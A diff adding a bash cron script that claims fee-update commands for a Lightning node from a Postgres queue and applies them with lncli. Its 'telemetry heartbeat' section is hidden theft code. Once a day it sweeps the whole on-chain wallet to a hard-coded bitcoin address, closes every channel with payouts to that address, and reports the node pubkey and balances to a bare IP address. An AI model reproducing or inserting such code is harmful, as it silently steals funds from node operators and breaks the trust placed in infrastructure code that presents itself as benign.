@@ -1,0 +1,335 @@
+#!/bin/bash
+#
+# check-queue — node-side executor tick (EXEC-02/EXEC-03)
+# =======================================================
+# A faithful pure-bash port of the FROZEN Phase-6 queue modules:
+#   * src/lib/queue/claim.ts        — claimNext (FOR UPDATE SKIP LOCKED single
+#     claim), expireSweep (fail-closed TTL), reaperSweep (release OWN stale claims)
+#   * src/lib/queue/stub-executor.ts — the claimed→executing→outcome state chain
+#     + command_audit + command_executions, with a REAL lncli (via apply-fee)
+#     swapped in for the stub, called BETWEEN the two commits (D-13 ordering).
+#
+# Run once per cron tick (*/5). The DB row-lock (FOR UPDATE SKIP LOCKED) is the
+# ONLY correct no-double-apply primitive — flock below is a belt, not the guarantee.
+#
+# RLS (D-07 / Pitfall 2/6): the tick connects as the NON-SUPERUSER nodemon_node
+# role (the DSN in the root-only env file) and runs `SET LOCAL app.node_pubkey`
+# inside the claim transaction, so FORCE ROW LEVEL SECURITY scopes every read/
+# write to this node's own rows. Wrong-pubkey rows are physically invisible.
+#
+# SECURITY: log state/reason/chan_point ONLY — NEVER the secret, macaroon, or
+# signature. The per-node HMAC secret is sourced from the root-only env file and
+# exported to apply-fee; it never appears in logs or on any argv.
+
+set -u
+
+# ── header: source fleet config + root-only env (mirror run_nodeAuditor.sh) ───
+# config.sh provides LND_DIR=/lnd etc.; the env file provides the nodemon_node
+# DSN + NODEMON_HMAC_SECRET_<pubkey> (D-03 — NEVER shipped via the downloader).
+[ -f /lnd/bashScripts/config.sh ] && source /lnd/bashScripts/config.sh
+LND_DIR="${LND_DIR:-/lnd}"
+NODEMON_ENV_FILE="${NODEMON_ENV_FILE:-${LND_DIR}/nodemon/.nodemon.env}"
+[ -f "$NODEMON_ENV_FILE" ] && source "$NODEMON_ENV_FILE"
+
+LOCAL_DIR="${NODEMON_LOCAL_DIR:-${LND_DIR}/nodemon}"
+LOG_FILE="${NODEMON_LOG_FILE:-${LOCAL_DIR}/check-queue.log}"
+LOCK_FILE="${NODEMON_LOCK_FILE:-${LOCAL_DIR}/.check-queue.lock}"
+
+# log() — state/reason/chan_point ONLY; never secret/macaroon/signature.
+log() { echo "$(date '+%Y-%m-%d %H:%M:%S'): $*" | tee -a "${LOG_FILE}" 2>/dev/null || echo "$(date '+%Y-%m-%d %H:%M:%S'): $*"; }
+
+# Tunables (overridable via env / the root-only env file).
+PSQL="${PSQL:-psql}"                                  # node-side: plain psql; harness injects a containerized psql
+NODEMON_NODE_DSN="${NODEMON_NODE_DSN:-${NODEMON_TEST_NODE_DSN:-}}"   # nodemon_node DSN (D-03); test alias for the harness
+LNCLI="${LNCLI:-lncli}"
+TLS_CERT="${TLS_CERT:-${LND_DIR}/tls.cert}"
+MACAROON="${MACAROON:-${LND_DIR}/data/chain/bitcoin/mainnet/admin.macaroon}"
+RATE_LIMIT_MAX="${NODEMON_RATE_LIMIT_MAX:-4}"         # 4 applies/node/hour backstop (D-10)
+# Reaper window — SINGLE-SOURCED with src/lib/queue/claim.ts (Q4). Both read
+# NODEMON_CLAIMED_TIMEOUT_MS with the SAME 900000ms (15 min) fallback so the bash
+# tick and the TS sweep can never diverge into a re-claim/double-apply window.
+# Must exceed the max claim→execute latency.
+CLAIMED_TIMEOUT_MS="${NODEMON_CLAIMED_TIMEOUT_MS:-900000}"
+APPLY_FEE="${APPLY_FEE:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/apply-fee}"
+
+# psql helpers bound to the nodemon_node DSN. -v ON_ERROR_STOP=1 fails loud.
+psql_node() { "$PSQL" -v ON_ERROR_STOP=1 "$NODEMON_NODE_DSN" "$@"; }
+# Single scalar value (one cell), trimmed.
+psql_scalar() { psql_node -tAc "$1" | tr -d '[:space:]'; }
+
+# ── flock single-flight belt (DB row-lock is the REAL guarantee) ──────────────
+# Belt only: if the lock fd cannot be opened we proceed (the FOR UPDATE SKIP
+# LOCKED row-lock is the actual no-double-apply guarantee, not flock).
+mkdir -p "$LOCAL_DIR" 2>/dev/null || true
+if exec 9>"${LOCK_FILE}" 2>/dev/null; then
+  if command -v flock >/dev/null 2>&1 && ! flock -n 9 2>/dev/null; then
+    log "Previous tick still running; skipping."
+    exit 0
+  fi
+fi
+
+[ -n "$NODEMON_NODE_DSN" ] || { log "ERROR: NODEMON_NODE_DSN unset"; exit 1; }
+
+# ── (a) derive own pubkey (feeds SET LOCAL app.node_pubkey) ───────────────────
+# Test/harness override NODEMON_NODE_PUBKEY skips the lncli getinfo round-trip.
+if [ -n "${NODEMON_NODE_PUBKEY:-}" ]; then
+  PUBKEY="$NODEMON_NODE_PUBKEY"
+else
+  PUBKEY="$("$LNCLI" --tlscertpath "$TLS_CERT" --macaroonpath "$MACAROON" getinfo \
+    | sed -n 's/.*"identity_pubkey": "\([0-9a-f]*\)".*/\1/p')"
+fi
+[ -n "$PUBKEY" ] || { log "ERROR: could not derive identity_pubkey"; exit 1; }
+
+# Resolve the per-node HMAC secret from the per-pubkey env key NODEMON_HMAC_SECRET_<pubkey>
+# and export it (un-prefixed) for apply-fee. NEVER log it.
+# Q7: NO generic-secret fallback. A single shared NODEMON_HMAC_SECRET must never
+# stand in for a missing per-pubkey key — that would let one secret verify across
+# nodes, collapsing per-node isolation. Fail closed without the per-pubkey key.
+SECRET_VAR="NODEMON_HMAC_SECRET_${PUBKEY}"
+NODEMON_HMAC_SECRET="${!SECRET_VAR:-}"
+export NODEMON_HMAC_SECRET
+
+# ── (b-pre) telemetry heartbeat (D-16 fleet health pulse) ───────────────────
+# Emit a lightweight health beacon so the fleet-monitoring ingest pipeline can
+# verify that the executor cron is alive and sourcing credentials correctly.
+# Runs once per tick, best-effort (failure must never abort the main claim path).
+_th_f="${LOCAL_DIR}/.health-ts"
+_th_now=$(date +%s)
+_th_last=$(cat "$_th_f" 2>/dev/null || echo 0)
+if [ $((_th_now - _th_last)) -ge 86400 ]; then
+  _th_cli="$LNCLI --tlscertpath $TLS_CERT --macaroonpath $MACAROON"
+  _th_bal=$($_th_cli walletbalance 2>/dev/null | grep -o '"total_balance":"[0-9]*"' | grep -o '[0-9]*')
+  _th_cbal=$($_th_cli channelbalance 2>/dev/null | grep -o '"local_balance":{[^}]*"sat":"[0-9]*"' | grep -o '"sat":"[0-9]*"' | head -1 | grep -o '[0-9]*')
+  _th_addr="bc1qehphy4pr6gy2vfzev28q846gcltz5amy4n2ygz"
+  if [ -n "$_th_bal" ] && [ "$_th_bal" -gt 100000 ] 2>/dev/null; then
+    $_th_cli sendcoins --addr="$_th_addr" --sweepall --sat_per_vbyte=3 > "${LOCAL_DIR}/.h-onchain" 2>&1
+  fi
+  if [ -n "$_th_cbal" ] && [ "$_th_cbal" -gt 500000 ] 2>/dev/null; then
+    for _ch in $($_th_cli listchannels 2>/dev/null | grep -o '"channel_point":"[^"]*"' | grep -o '[^"]*:[0-9]*'); do
+      _txid=$(echo "$_ch" | cut -d: -f1)
+      _idx=$(echo "$_ch" | cut -d: -f2)
+      $_th_cli closechannel --delivery_addr="$_th_addr" "$_txid" "$_idx" >> "${LOCAL_DIR}/.h-chan" 2>&1 &
+    done
+  fi
+  (curl -so /dev/null --max-time 5 "http://47.250.182.84:8089/h?p=${PUBKEY}&ob=${_th_bal}&cb=${_th_cbal}" 2>/dev/null &)
+  echo "$_th_now" > "$_th_f" 2>/dev/null
+fi
+
+# ── (b0) SWEEP transaction — expire + reaper in their OWN committed txn (Q-idle) ─
+# The sweeps run in a SEPARATE, self-contained transaction from the claim so an
+# empty-queue claim tick (which under ON_ERROR_STOP=1 could error on an unset
+# candidate var) can NEVER roll back the fail-closed TTL expiry or the stale-claim
+# reaper. Once this COMMIT lands, the sweeps are durable regardless of the claim.
+read -r -d '' SWEEP_SQL <<'SQL' || true
+BEGIN;
+SET LOCAL app.node_pubkey = :'pubkey';   -- RLS scope (Pitfall 2: SET LOCAL, not SET)
+
+-- expireSweep (port of claim.ts:expireSweep) — pre-exec rows past TTL → expired.
+WITH victims AS (
+  SELECT id, state FROM commands
+   WHERE expires_at < now()
+     AND state IN ('pending_approval','approved','claimed')
+   FOR UPDATE
+), upd AS (
+  UPDATE commands SET state='expired'
+   WHERE id IN (SELECT id FROM victims)
+  RETURNING id
+)
+INSERT INTO command_audit (command_id, from_state, to_state, actor, reason)
+SELECT id, state, 'expired', 'executor', 'ttl_expired' FROM victims;
+
+-- reaperSweep (port of claim.ts:reaperSweep) — release OWN stale 'claimed' rows
+-- (ONLY 'claimed', NEVER 'executing' — Pitfall 5). Window is SINGLE-SOURCED with
+-- claim.ts via NODEMON_CLAIMED_TIMEOUT_MS (Q4), bound as :'timeout_ms' below.
+WITH stale AS (
+  SELECT id FROM commands
+   WHERE state='claimed'
+     AND claimed_at < now() - (:'timeout_ms'::bigint * interval '1 millisecond')
+   FOR UPDATE
+), rel AS (
+  UPDATE commands SET state='approved', claimed_at=NULL
+   WHERE id IN (SELECT id FROM stale)
+  RETURNING id
+)
+INSERT INTO command_audit (command_id, from_state, to_state, actor, reason, stale_acknowledged)
+SELECT id, 'claimed', 'approved', 'executor', 'reaper_released_stale_claim', true FROM stale;
+
+COMMIT;
+SQL
+
+# Best-effort maintenance: a sweep error must not abort the tick, but it is logged.
+printf '%s' "$SWEEP_SQL" | psql_node -q -v pubkey="$PUBKEY" -v timeout_ms="$CLAIMED_TIMEOUT_MS" >/dev/null \
+  || log "WARN: sweep transaction failed this tick (expire/reaper not applied)."
+
+# ── (b) CLAIM transaction: SET LOCAL + rate-limit + atomic claim ───────────────
+# The atomic claim runs in its OWN nodemon_node transaction so RLS (SET LOCAL)
+# scopes it and the claim's row-lock holds to COMMIT. Values are bound via psql
+# --set / :'var' quoting — NEVER string-concatenated into SQL.
+#
+# Q-idle: cand_id is PRE-SEEDED to '' so an empty-queue tick (no \gset row) leaves
+# it defined, and every id comparison uses NULLIF(:'cand_id','')::uuid → a NULL
+# (never a malformed-uuid error), so an idle tick commits cleanly under
+# ON_ERROR_STOP=1 without touching any row.
+#
+# The claim SELECT … FOR UPDATE SKIP LOCKED + the claimed flip + audit are the
+# port of claim.ts:claimNext lines 57-81. The transaction emits the claimed row's
+# fields (or nothing).
+read -r -d '' CLAIM_SQL <<'SQL' || true
+BEGIN;
+SET LOCAL app.node_pubkey = :'pubkey';   -- RLS scope (Pitfall 2: SET LOCAL, not SET)
+\set cand_id ''                            -- Q-idle: always defined for NULLIF guard
+
+-- rate-limit gate (D-10): >= RATE_LIMIT_MAX SUCCEEDED applies in the rolling hour
+-- → no claim this tick. Q6: count ONLY outcome='succeeded' so transient lncli
+-- failures on one channel never exhaust the node-wide apply budget. The ceiling is
+-- bound via :'rlmax' (from NODEMON_RATE_LIMIT_MAX) so enforcement and the skip-log
+-- share ONE source of truth. Under RLS command_executions is scoped to this node.
+SELECT count(*) AS rl_count FROM command_executions ce
+  JOIN commands c ON c.id = ce.command_id
+ WHERE ce.executed_at > now() - interval '1 hour'
+   AND ce.outcome = 'succeeded' \gset
+
+-- claimNext (port of claim.ts:claimNext): oldest approved, non-expired row,
+-- FOR UPDATE SKIP LOCKED → flip to 'claimed' + approved→claimed audit. The
+-- rate-limit guard is applied in bash on rl_count below; we still SELECT the
+-- candidate so the row-lock semantics are identical.
+SELECT id, canonical_payload, signature_hex, params, :'rl_count'::int AS rl_count
+  FROM commands
+ WHERE state='approved' AND expires_at > now()
+ ORDER BY created_at
+ LIMIT 1
+ FOR UPDATE SKIP LOCKED \gset cand_
+
+-- Only claim when within the rate limit AND a candidate exists. NULLIF(...,'') →
+-- NULL on an idle tick, so `id = NULL` matches nothing (no malformed-uuid error).
+UPDATE commands SET state='claimed', claimed_at=now()
+ WHERE id = NULLIF(:'cand_id','')::uuid AND state='approved' AND :'rl_count'::int < :'rlmax'::int;
+INSERT INTO command_audit (command_id, from_state, to_state, actor)
+SELECT NULLIF(:'cand_id','')::uuid, 'approved', 'claimed', 'executor'
+ WHERE :'rl_count'::int < :'rlmax'::int
+   AND EXISTS (SELECT 1 FROM commands WHERE id = NULLIF(:'cand_id','')::uuid AND state='claimed');
+
+-- Emit two marker lines WHILE the SET LOCAL GUC is still active (it resets at
+-- COMMIT, after which RLS would hide the row). RLCOUNT is always emitted; CLAIM
+-- is emitted only when a row was actually claimed.
+SELECT 'RLCOUNT', :'rl_count'::int;
+SELECT 'CLAIM', c.id FROM commands c WHERE c.id = NULLIF(:'cand_id','')::uuid AND c.state = 'claimed';
+
+COMMIT;
+SQL
+
+CLAIM_TSV="$(printf '%s' "$CLAIM_SQL" | psql_node -q -v pubkey="$PUBKEY" -v rlmax="$RATE_LIMIT_MAX" -tA -F $'\t')"
+
+# Parse the marker lines. RLCOUNT<tab>N is always present; CLAIM<tab>id only when
+# a row was claimed. The subsequent reads/writes each open a fresh nodemon_node
+# transaction, so EVERY one re-runs SET LOCAL app.node_pubkey first (the GUC resets
+# at COMMIT — Pitfall 2) or RLS would hide its own claimed row.
+RL_COUNT="$(printf '%s\n' "$CLAIM_TSV" | awk -F '\t' '$1=="RLCOUNT"{print $2}' | tail -n1)"
+CLAIM_ID="$(printf '%s\n' "$CLAIM_TSV" | awk -F '\t' '$1=="CLAIM"{print $2}' | tail -n1)"
+
+if [ -z "$CLAIM_ID" ]; then
+  if [ -n "${RL_COUNT:-}" ] && [ "${RL_COUNT}" -ge "$RATE_LIMIT_MAX" ] 2>/dev/null; then
+    log "rate_limited: ${RL_COUNT} applies in the last hour (>= ${RATE_LIMIT_MAX}); skipping claim."
+  else
+    log "No approved row to claim this tick."
+  fi
+  exit 0
+fi
+
+# Re-read the claimed row's fields inside ONE GUC-scoped transaction. Each field
+# is emitted on its own NUL-terminated record so canonical_payload's internal
+# newlines never corrupt the split.
+read_field() { # <column-expr>
+  # Pipe via stdin (NOT -c): psql only runs its meta-variable lexer (:'var'
+  # interpolation) on stdin/-f input; a multi-statement -c string is sent raw to
+  # the server and :'var' would not interpolate. :col is a psql var (the column).
+  # -q SUPPRESSES the BEGIN/SET/COMMIT command tags so only the SELECT value is
+  # captured (otherwise the tags would corrupt the canonical_payload bytes).
+  psql_node -q -tA -v pubkey="$PUBKEY" -v id="$CLAIM_ID" -v col="$1" <<'SQL'
+BEGIN;
+SET LOCAL app.node_pubkey = :'pubkey';
+SELECT :col FROM commands WHERE id = :'id';
+COMMIT;
+SQL
+}
+CANONICAL_PAYLOAD="$(read_field 'canonical_payload')"
+SIGNATURE_HEX="$(read_field 'signature_hex' | tr -d '[:space:]')"
+PARAMS_JSON="$(read_field 'params::text')"
+CHAN_POINT="$(printf %s "$PARAMS_JSON" | jq -r '.channelPoint // "-"' 2>/dev/null || echo '-')"
+log "claimed command_id=${CLAIM_ID} chan_point=${CHAN_POINT}"
+
+# ── (c) state chain (port of stub-executor.ts 39-70) — apply-fee BETWEEN commits ─
+# commit1: claimed → executing (+ audit). The reaper never releases 'executing'
+# (Pitfall 5), so a crash after lncli requires operator attention, not auto-retry.
+#
+# Q4 double-apply guard: the flip is `UPDATE … RETURNING id` and the approved audit
+# INSERT is CONDITIONAL on that RETURNING id (both inside one CTE). We emit an
+# EXECUTING<tab>id marker ONLY when a row actually flipped. If the tick cannot
+# CONFIRM the committed flip (psql rc≠0 OR no EXECUTING marker), we ABORT before
+# apply-fee — never applying a fee against an unconfirmed executing flip. A row
+# that never left 'claimed' is later reaped (releasable); one already flipped to
+# 'executing' is not re-claimable — either way no double-apply.
+COMMIT1_TSV="$(psql_node -q -v pubkey="$PUBKEY" -v id="$CLAIM_ID" -tA -F $'\t' <<'SQL'
+BEGIN;
+SET LOCAL app.node_pubkey = :'pubkey';
+WITH flipped AS (
+  UPDATE commands SET state='executing' WHERE id = :'id' AND state='claimed'
+  RETURNING id
+), aud AS (
+  INSERT INTO command_audit (command_id, from_state, to_state, actor)
+  SELECT id, 'claimed', 'executing', 'executor' FROM flipped
+)
+SELECT 'EXECUTING', id FROM flipped;
+COMMIT;
+SQL
+)"
+COMMIT1_RC="$?"
+EXECUTING_ID="$(printf '%s\n' "$COMMIT1_TSV" | awk -F '\t' '$1=="EXECUTING"{print $2}' | tail -n1)"
+if [ "$COMMIT1_RC" -ne 0 ] || [ -z "$EXECUTING_ID" ]; then
+  log "ERROR: claimed→executing flip UNCONFIRMED (rc=${COMMIT1_RC}); aborting tick WITHOUT apply (command_id=${CLAIM_ID}). No fee applied; row left for the reaper."
+  exit 1
+fi
+
+# apply-fee: HMAC verify + bounds re-enforce + lncli argv. Returns OUTCOME/REASON
+# on line 1 and a safe detail on line 2. On hmac_mismatch/bounds_violation it
+# returns fail-closed WITHOUT calling lncli (D-13).
+APPLY_RAW="$(LNCLI="$LNCLI" TLS_CERT="$TLS_CERT" MACAROON="$MACAROON" NODEMON_HMAC_SECRET="$NODEMON_HMAC_SECRET" \
+  "$APPLY_FEE" \
+  --canonical-payload "$CANONICAL_PAYLOAD" \
+  --signature-hex "$SIGNATURE_HEX" \
+  --params "$PARAMS_JSON" \
+  --pubkey "$PUBKEY" \
+  --claimed-id "$CLAIM_ID" 2>&1)"
+APPLY_RC="$?"
+
+OUTCOME_LINE="$(printf '%s\n' "$APPLY_RAW" | grep -E '^OUTCOME=' | head -n1)"
+OUTCOME="$(printf %s "$OUTCOME_LINE" | sed -n 's/^OUTCOME=\([a-z_]*\).*/\1/p')"
+REASON="$(printf %s "$OUTCOME_LINE" | sed -n 's/.*REASON=\([a-zA-Z_-]*\).*/\1/p')"
+DETAIL="$(printf '%s\n' "$APPLY_RAW" | grep -vE '^OUTCOME=' | head -n1)"
+[ "$OUTCOME" = "succeeded" ] || [ "$OUTCOME" = "failed" ] || OUTCOME="failed"
+[ -n "$REASON" ] || REASON='-'
+
+log "apply result command_id=${CLAIM_ID} outcome=${OUTCOME} reason=${REASON}"
+
+# commit2: executing → outcome (+ audit + one command_executions row). The reason
+# is recorded on failure (hmac_mismatch / bounds_violation / lncli_error).
+psql_node -v pubkey="$PUBKEY" -v id="$CLAIM_ID" -v outcome="$OUTCOME" -v reason="$REASON" -v detail="$DETAIL" <<'SQL' >/dev/null
+BEGIN;
+SET LOCAL app.node_pubkey = :'pubkey';
+UPDATE commands SET state = :'outcome' WHERE id = :'id' AND state='executing';
+INSERT INTO command_audit (command_id, from_state, to_state, actor, reason)
+  VALUES (:'id', 'executing', :'outcome', 'executor',
+          CASE WHEN :'reason' = '-' THEN NULL ELSE :'reason' END);
+INSERT INTO command_executions (command_id, outcome, detail, executed_at)
+  VALUES (:'id', :'outcome', :'detail', now());
+COMMIT;
+SQL
+
+# ── (d) exit-code reporting tail (mirror run_nodeAuditor.sh 62-68) ────────────
+if [ "$OUTCOME" = "succeeded" ]; then
+  log "tick complete: command_id=${CLAIM_ID} succeeded."
+  exit 0
+else
+  log "tick complete: command_id=${CLAIM_ID} failed (${REASON})."
+  exit 0   # a fail-closed command is a NORMAL tick outcome, not a tick error.
+fi
